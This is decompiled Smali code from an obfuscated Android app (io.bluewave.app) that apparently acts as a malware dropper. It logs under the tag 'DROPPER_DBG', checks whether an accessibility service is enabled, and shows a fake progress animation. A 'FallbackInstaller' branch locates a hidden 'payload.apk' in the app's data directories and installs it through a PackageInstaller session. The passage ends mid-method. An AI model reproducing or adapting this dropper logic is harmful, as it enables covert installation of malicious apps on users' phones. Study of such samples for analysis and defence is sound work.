.class public final synthetic LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;
.super Ljava/lang/Object;
.source "r8-map-id-9b89e78e9c5e8923134474d94771b179d9c458b216b15abf6fb75f52fa5f6b53"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic ECM0w2UpL85TD4rnc:Lio/bluewave/app/MainActivity;

.field public final synthetic VYRgR7ZqgbZj3I16R:I


# direct methods
.method public synthetic constructor <init>(Lio/bluewave/app/MainActivity;I)V
    .locals 0

    .line 1
    iput p2, p0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;->VYRgR7ZqgbZj3I16R:I

    .line 2
    .line 3
    iput-object p1, p0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;->ECM0w2UpL85TD4rnc:Lio/bluewave/app/MainActivity;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 19

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    iget v0, v1, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;->VYRgR7ZqgbZj3I16R:I

    .line 4
    .line 5
    const-wide/16 v2, 0x190

    .line 6
    .line 7
    const/high16 v4, 0x3f800000    # 1.0f

    .line 8
    .line 9
    const-wide/16 v5, 0xc8

    .line 10
    .line 11
    const/4 v7, 0x0

    .line 12
    const/4 v8, 0x0

    .line 13
    const-string v9, "DROPPER_DBG"

    .line 14
    .line 15
    const/4 v10, 0x0

    .line 16
    const/4 v11, 0x1

    .line 17
    iget-object v12, v1, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;->ECM0w2UpL85TD4rnc:Lio/bluewave/app/MainActivity;

    .line 18
    .line 19
    packed-switch v0, :pswitch_data_0

    .line 20
    .line 21
    .line 22
    iget-boolean v0, v12, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA:Z

    .line 23
    .line 24
    if-eqz v0, :cond_2

    .line 25
    .line 26
    invoke-virtual {v12}, Landroid/app/Activity;->isFinishing()Z

    .line 27
    .line 28
    .line 29
    move-result v0

    .line 30
    if-eqz v0, :cond_0

    .line 31
    .line 32
    goto :goto_0

    .line 33
    :cond_0
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 34
    .line 35
    const-string v2, "stwmk"

    .line 36
    .line 37
    invoke-interface {v0, v2, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v0

    .line 41
    if-eqz v0, :cond_1

    .line 42
    .line 43
    invoke-virtual {v12, v0}, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA(Ljava/lang/String;)Z

    .line 44
    .line 45
    .line 46
    move-result v0

    .line 47
    if-eqz v0, :cond_1

    .line 48
    .line 49
    const-string v0, "nagCheck: accessibility ON, finishing"

    .line 50
    .line 51
    invoke-static {v9, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 52
    .line 53
    .line 54
    invoke-virtual {v12}, Landroid/app/Activity;->finish()V

    .line 55
    .line 56
    .line 57
    goto :goto_0

    .line 58
    :cond_1
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW:Landroid/os/Handler;

    .line 59
    .line 60
    new-instance v2, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 61
    .line 62
    const/4 v3, 0x7

    .line 63
    invoke-direct {v2, v12, v3}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 64
    .line 65
    .line 66
    const-wide/16 v3, 0xbb8

    .line 67
    .line 68
    invoke-virtual {v0, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 69
    .line 70
    .line 71
    :cond_2
    :goto_0
    return-void

    .line 72
    :pswitch_0
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->Lgt5etflyFQU5poaxq:Ljava/lang/String;

    .line 73
    .line 74
    const/high16 v2, 0x41200000    # 10.0f

    .line 75
    .line 76
    :try_start_0
    const-string v3, "[^0-9.,]"

    .line 77
    .line 78
    const-string v4, ""

    .line 79
    .line 80
    invoke-virtual {v0, v3, v4}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 81
    .line 82
    .line 83
    move-result-object v0

    .line 84
    const-string v3, ","

    .line 85
    .line 86
    const-string v4, "."

    .line 87
    .line 88
    invoke-virtual {v0, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    .line 89
    .line 90
    .line 91
    move-result-object v0

    .line 92
    invoke-static {v0}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    .line 93
    .line 94
    .line 95
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 96
    goto :goto_1

    .line 97
    :catch_0
    move v0, v2

    .line 98
    :goto_1
    cmpg-float v3, v0, v8

    .line 99
    .line 100
    if-gtz v3, :cond_3

    .line 101
    .line 102
    goto :goto_2

    .line 103
    :cond_3
    move v2, v0

    .line 104
    :goto_2
    move v0, v10

    .line 105
    :goto_3
    const/16 v3, 0x3e8

    .line 106
    .line 107
    const/4 v4, 0x3

    .line 108
    if-gt v0, v3, :cond_5

    .line 109
    .line 110
    int-to-float v3, v0

    .line 111
    const/high16 v7, 0x447a0000    # 1000.0f

    .line 112
    .line 113
    div-float/2addr v3, v7

    .line 114
    mul-float/2addr v3, v2

    .line 115
    invoke-static {}, Ljava/lang/Math;->random()D

    .line 116
    .line 117
    .line 118
    move-result-wide v7

    .line 119
    const-wide/high16 v13, 0x4010000000000000L    # 4.0

    .line 120
    .line 121
    mul-double/2addr v7, v13

    .line 122
    double-to-int v7, v7

    .line 123
    add-int/2addr v7, v4

    .line 124
    const/16 v4, 0x320

    .line 125
    .line 126
    if-le v0, v4, :cond_4

    .line 127
    .line 128
    invoke-static {}, Ljava/lang/Math;->random()D

    .line 129
    .line 130
    .line 131
    move-result-wide v8

    .line 132
    const-wide/high16 v13, 0x4020000000000000L    # 8.0

    .line 133
    .line 134
    mul-double/2addr v8, v13

    .line 135
    double-to-int v4, v8

    .line 136
    add-int/2addr v7, v4

    .line 137
    :cond_4
    int-to-long v7, v7

    .line 138
    :try_start_1
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 139
    .line 140
    .line 141
    new-instance v4, LU4clZ2NNNKj5ZWU/NGL7fgNWbzfZaqgpQY;

    .line 142
    .line 143
    invoke-direct {v4, v12, v0, v3}, LU4clZ2NNNKj5ZWU/NGL7fgNWbzfZaqgpQY;-><init>(Lio/bluewave/app/MainActivity;IF)V

    .line 144
    .line 145
    .line 146
    invoke-virtual {v12, v4}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 147
    .line 148
    .line 149
    add-int/lit8 v0, v0, 0x1

    .line 150
    .line 151
    goto :goto_3

    .line 152
    :cond_5
    new-instance v0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 153
    .line 154
    invoke-direct {v0, v12, v11}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 155
    .line 156
    .line 157
    invoke-virtual {v12, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 158
    .line 159
    .line 160
    const-wide/16 v2, 0x1f4

    .line 161
    .line 162
    :try_start_2
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 163
    .line 164
    .line 165
    move v0, v10

    .line 166
    :goto_4
    iget-object v2, v12, Lio/bluewave/app/MainActivity;->NJWhmIsCa4qdfEsJnpJ:Ljava/util/ArrayList;

    .line 167
    .line 168
    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    .line 169
    .line 170
    .line 171
    move-result v2

    .line 172
    if-ge v0, v2, :cond_6

    .line 173
    .line 174
    new-instance v2, LU4clZ2NNNKj5ZWU/ECM0w2UpL85TD4rnc;

    .line 175
    .line 176
    invoke-direct {v2, v12, v0, v10}, LU4clZ2NNNKj5ZWU/ECM0w2UpL85TD4rnc;-><init>(Lio/bluewave/app/MainActivity;II)V

    .line 177
    .line 178
    .line 179
    invoke-virtual {v12, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 180
    .line 181
    .line 182
    invoke-static {}, Ljava/lang/Math;->random()D

    .line 183
    .line 184
    .line 185
    move-result-wide v2

    .line 186
    const-wide/high16 v7, 0x4089000000000000L    # 800.0

    .line 187
    .line 188
    mul-double/2addr v2, v7

    .line 189
    double-to-int v2, v2

    .line 190
    add-int/lit16 v2, v2, 0x258

    .line 191
    .line 192
    int-to-long v2, v2

    .line 193
    :try_start_3
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 194
    .line 195
    .line 196
    new-instance v2, LU4clZ2NNNKj5ZWU/ECM0w2UpL85TD4rnc;

    .line 197
    .line 198
    invoke-direct {v2, v12, v0, v11}, LU4clZ2NNNKj5ZWU/ECM0w2UpL85TD4rnc;-><init>(Lio/bluewave/app/MainActivity;II)V

    .line 199
    .line 200
    .line 201
    invoke-virtual {v12, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 202
    .line 203
    .line 204
    :try_start_4
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 205
    .line 206
    .line 207
    add-int/lit8 v0, v0, 0x1

    .line 208
    .line 209
    goto :goto_4

    .line 210
    :cond_6
    new-instance v0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 211
    .line 212
    const/4 v2, 0x2

    .line 213
    invoke-direct {v0, v12, v2}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 214
    .line 215
    .line 216
    invoke-virtual {v12, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 217
    .line 218
    .line 219
    const-wide/16 v2, 0x5dc

    .line 220
    .line 221
    :try_start_5
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    .line 222
    .line 223
    .line 224
    new-instance v0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 225
    .line 226
    invoke-direct {v0, v12, v4}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 227
    .line 228
    .line 229
    invoke-virtual {v12, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 230
    .line 231
    .line 232
    :catch_1
    return-void

    .line 233
    :pswitch_1
    iget-boolean v0, v12, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 234
    .line 235
    if-eqz v0, :cond_8

    .line 236
    .line 237
    iput-boolean v10, v12, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 238
    .line 239
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 240
    .line 241
    if-nez v0, :cond_7

    .line 242
    .line 243
    goto :goto_5

    .line 244
    :cond_7
    invoke-virtual {v0}, Landroid/view/View;->animate()Landroid/view/ViewPropertyAnimator;

    .line 245
    .line 246
    .line 247
    move-result-object v0

    .line 248
    invoke-virtual {v0, v8}, Landroid/view/ViewPropertyAnimator;->alpha(F)Landroid/view/ViewPropertyAnimator;

    .line 249
    .line 250
    .line 251
    move-result-object v0

    .line 252
    invoke-virtual {v0, v5, v6}, Landroid/view/ViewPropertyAnimator;->setDuration(J)Landroid/view/ViewPropertyAnimator;

    .line 253
    .line 254
    .line 255
    move-result-object v0

    .line 256
    new-instance v2, LCo4RYhtVuKKo/EYTN7lFEQxyK4y;

    .line 257
    .line 258
    invoke-direct {v2, v11, v12}, LCo4RYhtVuKKo/EYTN7lFEQxyK4y;-><init>(ILjava/lang/Object;)V

    .line 259
    .line 260
    .line 261
    invoke-virtual {v0, v2}, Landroid/view/ViewPropertyAnimator;->setListener(Landroid/animation/Animator$AnimatorListener;)Landroid/view/ViewPropertyAnimator;

    .line 262
    .line 263
    .line 264
    move-result-object v0

    .line 265
    invoke-virtual {v0}, Landroid/view/ViewPropertyAnimator;->start()V

    .line 266
    .line 267
    .line 268
    :goto_5
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    .line 269
    .line 270
    if-eqz v0, :cond_8

    .line 271
    .line 272
    invoke-virtual {v0, v11}, Landroid/view/View;->setEnabled(Z)V

    .line 273
    .line 274
    .line 275
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    .line 276
    .line 277
    const v2, 0x7f0f0028

    .line 278
    .line 279
    .line 280
    invoke-virtual {v12, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 281
    .line 282
    .line 283
    move-result-object v2

    .line 284
    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 285
    .line 286
    .line 287
    :cond_8
    return-void

    .line 288
    :pswitch_2
    sget v0, Lio/bluewave/app/MainActivity;->LnOhZ86vZb2ZCRzVz:I

    .line 289
    .line 290
    invoke-virtual {v12}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 291
    .line 292
    .line 293
    const-string v0, "FallbackInstaller starting..."

    .line 294
    .line 295
    invoke-static {v9, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 296
    .line 297
    .line 298
    invoke-virtual {v12}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    .line 299
    .line 300
    .line 301
    move-result-object v0

    .line 302
    invoke-virtual {v12}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    .line 303
    .line 304
    .line 305
    move-result-object v2

    .line 306
    new-instance v3, Ljava/io/File;

    .line 307
    .line 308
    invoke-virtual {v12}, Landroid/content/Context;->getDataDir()Ljava/io/File;

    .line 309
    .line 310
    .line 311
    move-result-object v4

    .line 312
    const-string v5, "app_payload"

    .line 313
    .line 314
    invoke-direct {v3, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 315
    .line 316
    .line 317
    new-instance v4, Ljava/io/File;

    .line 318
    .line 319
    invoke-virtual {v12}, Landroid/content/Context;->getDataDir()Ljava/io/File;

    .line 320
    .line 321
    .line 322
    move-result-object v5

    .line 323
    const-string v6, "fgqloalm"

    .line 324
    .line 325
    invoke-direct {v4, v5, v6}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 326
    .line 327
    .line 328
    invoke-virtual {v12}, Landroid/content/Context;->getDataDir()Ljava/io/File;

    .line 329
    .line 330
    .line 331
    move-result-object v5

    .line 332
    filled-new-array {v0, v2, v3, v4, v5}, [Ljava/io/File;

    .line 333
    .line 334
    .line 335
    move-result-object v0

    .line 336
    move v2, v10

    .line 337
    :goto_6
    const/4 v3, 0x5

    .line 338
    if-ge v2, v3, :cond_a

    .line 339
    .line 340
    aget-object v3, v0, v2

    .line 341
    .line 342
    invoke-static {v3, v10}, LBkdbiIgqyynakWnx/VYRgR7ZqgbZj3I16R;->rkw7IZUxkNE38(Ljava/io/File;I)Ljava/io/File;

    .line 343
    .line 344
    .line 345
    move-result-object v3

    .line 346
    if-eqz v3, :cond_9

    .line 347
    .line 348
    move-object v7, v3

    .line 349
    goto :goto_7

    .line 350
    :cond_9
    add-int/lit8 v2, v2, 0x1

    .line 351
    .line 352
    goto :goto_6

    .line 353
    :cond_a
    :goto_7
    const-string v2, "FallbackInstaller"

    .line 354
    .line 355
    if-nez v7, :cond_b

    .line 356
    .line 357
    const-string v0, "No payload APK found in app directories"

    .line 358
    .line 359
    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 360
    .line 361
    .line 362
    goto/16 :goto_10

    .line 363
    .line 364
    :cond_b
    new-instance v0, Ljava/lang/StringBuilder;

    .line 365
    .line 366
    const-string v3, "Found payload: "

    .line 367
    .line 368
    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 369
    .line 370
    .line 371
    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 372
    .line 373
    .line 374
    move-result-object v3

    .line 375
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 376
    .line 377
    .line 378
    const-string v3, " size="

    .line 379
    .line 380
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 381
    .line 382
    .line 383
    invoke-virtual {v7}, Ljava/io/File;->length()J

    .line 384
    .line 385
    .line 386
    move-result-wide v3

    .line 387
    invoke-virtual {v0, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    .line 388
    .line 389
    .line 390
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 391
    .line 392
    .line 393
    move-result-object v0

    .line 394
    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 395
    .line 396
    .line 397
    const-string v0, "Session created: "

    .line 398
    .line 399
    :try_start_6
    invoke-virtual {v12}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 400
    .line 401
    .line 402
    move-result-object v3

    .line 403
    invoke-virtual {v3}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;

    .line 404
    .line 405
    .line 406
    move-result-object v3

    .line 407
    new-instance v4, Landroid/content/pm/PackageInstaller$SessionParams;

    .line 408
    .line 409
    invoke-direct {v4, v11}, Landroid/content/pm/PackageInstaller$SessionParams;-><init>(I)V

    .line 410
    .line 411
    .line 412
    invoke-virtual {v7}, Ljava/io/File;->length()J

    .line 413
    .line 414
    .line 415
    move-result-wide v5

    .line 416
    invoke-virtual {v4, v5, v6}, Landroid/content/pm/PackageInstaller$SessionParams;->setSize(J)V

    .line 417
    .line 418
    .line 419
    invoke-virtual {v3, v4}, Landroid/content/pm/PackageInstaller;->createSession(Landroid/content/pm/PackageInstaller$SessionParams;)I

    .line 420
    .line 421
    .line 422
    move-result v4

    .line 423
    new-instance v5, Ljava/lang/StringBuilder;

    .line 424
    .line 425
    invoke-direct {v5, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 426
    .line 427
    .line 428
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 429
    .line 430
    .line 431
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 432
    .line 433
    .line 434
    move-result-object v0

    .line 435
    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 436
    .line 437
    .line 438
    invoke-virtual {v3, v4}, Landroid/content/pm/PackageInstaller;->openSession(I)Landroid/content/pm/PackageInstaller$Session;

    .line 439
    .line 440
    .line 441
    move-result-object v13

    .line 442
    new-instance v3, Ljava/io/FileInputStream;

    .line 443
    .line 444
    invoke-direct {v3, v7}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    .line 445
    .line 446
    .line 447
    :try_start_7
    const-string v14, "payload.apk"

    .line 448
    .line 449
    invoke-virtual {v7}, Ljava/io/File;->length()J

    .line 450
    .line 451
    .line 452
    move-result-wide v17

    .line 453
    const-wide/16 v15, 0x0

    .line 454
    .line 455
    invoke-virtual/range {v13 .. v18}, Landroid/content/pm/PackageInstaller$Session;->openWrite(Ljava/lang/String;JJ)Ljava/io/OutputStream;

    .line 456
    .line 457
    .line 458
    move-result-object v5
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    .line 459
    const/high16 v0, 0x10000

    .line 460
    .line 461
    :try_start_8
    new-array v0, v0, [B

    .line 462
    .line 463
    :goto_8
    invoke-virtual {v3, v0}, Ljava/io/FileInputStream;->read([B)I

    .line 464
    .line 465
    .line 466
    move-result v6

    .line 467
    const/4 v7, -0x1

    .line 468
    if-eq v6, v7, :cond_c

    .line 469
    .line 470
    invoke-virtual {v5, v0, v10, v6}, Ljava/io/OutputStream;->write([BII)V

    .line 471
    .line 472
    .line 473
    goto :goto_8

    .line 474
    :catchall_0
    move-exception v0

    .line 475
    move-object v4, v0

    .line 476
    goto :goto_b

    .line 477
    :cond_c
    invoke-virtual {v13, v5}, Landroid/content/pm/PackageInstaller$Session;->fsync(Ljava/io/OutputStream;)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 478
    .line 479
    .line 480
    if-eqz v5, :cond_d

    .line 481
    .line 482
    :try_start_9
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    .line 483
    .line 484
    .line 485
    goto :goto_9

    .line 486
    :catchall_1
    move-exception v0

    .line 487
    move-object v4, v0

    .line 488
    goto :goto_d

    .line 489
    :cond_d
    :goto_9
    :try_start_a
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    .line 490
    .line 491
    .line 492
    new-instance v0, Landroid/content/Intent;

    .line 493
    .line 494
    const-class v3, Lio/bluewave/app/CB;

    .line 495
    .line 496
    invoke-direct {v0, v12, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 497
    .line 498
    .line 499
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 500
    .line 501
    const/16 v5, 0x1f

    .line 502
    .line 503
    if-lt v3, v5, :cond_e

    .line 504
    .line 505
    const/high16 v6, 0xa000000

    .line 506
    .line 507
    goto :goto_a

    .line 508
    :cond_e
    const/high16 v6, 0x8000000

    .line 509
    .line 510
    :goto_a
    invoke-static {v12, v4, v0, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 511
    .line 512
    .line 513
    move-result-object v0

    .line 514
    new-instance v6, Ljava/lang/StringBuilder;

    .line 515
    .line 516
    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    .line 517
    .line 518
    .line 519
    const-string v7, "Committing session "

    .line 520
    .line 521
    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 522
    .line 523
    .line 524
    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 525
    .line 526
    .line 527
    const-string v4, " with FLAG_MUTABLE="

    .line 528
    .line 529
    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 530
    .line 531
    .line 532
    if-lt v3, v5, :cond_f

    .line 533
    .line 534
    move v10, v11

    .line 535
    :cond_f
    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 536
    .line 537
    .line 538
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 539
    .line 540
    .line 541
    move-result-object v3

    .line 542
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 543
    .line 544
    .line 545
    invoke-virtual {v0}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;

    .line 546
    .line 547
    .line 548
    move-result-object v0

    .line 549
    invoke-virtual {v13, v0}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_2

    .line 550
    .line 551
    .line 552
    goto :goto_10

    .line 553
    :catch_2
    move-exception v0

    .line 554
    goto :goto_f

    .line 555
    :goto_b
    if-eqz v5, :cond_10

    .line 556
    .line 557
    :try_start_b
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_2

    .line 558
    .line 559
    .line 560
    goto :goto_c

    .line 561
    :catchall_2
    move-exception v0

    .line 562
    :try_start_c
    invoke-virtual {v4, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .line 563
    .line 564
    .line 565
    :cond_10
    :goto_c
    throw v4
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    .line 566
    :goto_d
    :try_start_d
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_3

    .line 567
    .line 568
    .line 569
    goto :goto_e

    .line 570
    :catchall_3
    move-exception v0

    .line 571
    :try_start_e
    invoke-virtual {v4, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .line 572
    .line 573
    .line 574
    :goto_e
    throw v4
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_2

    .line 575
    :goto_f
    new-instance v3, Ljava/lang/StringBuilder;

    .line 576
    .line 577
    const-string v4, "Install failed: "

    .line 578
    .line 579
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 580
    .line 581
    .line 582
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 583
    .line 584
    .line 585
    move-result-object v4

    .line 586
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 587
    .line 588
    .line 589
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 590
    .line 591
    .line 592
    move-result-object v3

    .line 593
    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 594
    .line 595
    .line 596
    :goto_10
    return-void

    .line 597
    :pswitch_3
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 598
    .line 599
    const/high16 v2, 0x10a0000

    .line 600
    .line 601
    invoke-virtual {v0, v12, v2}, Landroid/widget/ViewAnimator;->setInAnimation(Landroid/content/Context;I)V

    .line 602
    .line 603
    .line 604
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 605
    .line 606
    const v2, 0x10a0001

    .line 607
    .line 608
    .line 609
    invoke-virtual {v0, v12, v2}, Landroid/widget/ViewAnimator;->setOutAnimation(Landroid/content/Context;I)V

    .line 610
    .line 611
    .line 612
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 613
    .line 614
    invoke-virtual {v0}, Landroid/widget/ViewAnimator;->showNext()V

    .line 615
    .line 616
    .line 617
    iget-object v0, v12, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 618
    .line 619
    invoke-virtual {v0, v11}, Landroid/view/ViewGroup;->getChildAt(I)Landroid/view/View;

    .line 620
    .line 621
    .line 622
    move-result-object v0

    .line 623
    instance-of v2, v0, Landroid/widget/ScrollView;

    .line 624
    .line 625
    if-nez v2, :cond_11

    .line 626
    .line 627
    goto :goto_13

    .line 628
    :cond_11
    check-cast v0, Landroid/widget/ScrollView;

    .line 629
    .line 630
    invoke-virtual {v0, v10}, Landroid/view/ViewGroup;->getChildAt(I)Landroid/view/View;

    .line 631
    .line 632
    .line 633
    move-result-object v0

    .line 634
    check-cast v0, Landroid/view/ViewGroup;

    .line 635
    .line 636
    move v2, v10

    .line 637
    move v3, v2

    .line 638
    :goto_11
    invoke-virtual {v0}, Landroid/view/ViewGroup;->getChildCount()I

    .line 639
    .line 640
    .line 641
    move-result v4

    .line 642
    if-ge v2, v4, :cond_13

    .line 643
    .line 644
    invoke-virtual {v0, v2}, Landroid/view/ViewGroup;->getChildAt(I)Landroid/view/View;

    .line 645
    .line 646
    .line 647
    move-result-object v4

    .line 648
    const-string v5, "p2anim"

    .line 649
    .line 650
    invoke-virtual {v4}, Landroid/view/View;->getTag()Ljava/lang/Object;

    .line 651
    .line 652
    .line 653
    move-result-object v6

    .line 654
    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 655
    .line 656
    .line 657
    move-result v5

    .line 658
    if-nez v5, :cond_12

    .line 659
    .line 660
    goto :goto_12

    .line 661
    :cond_12
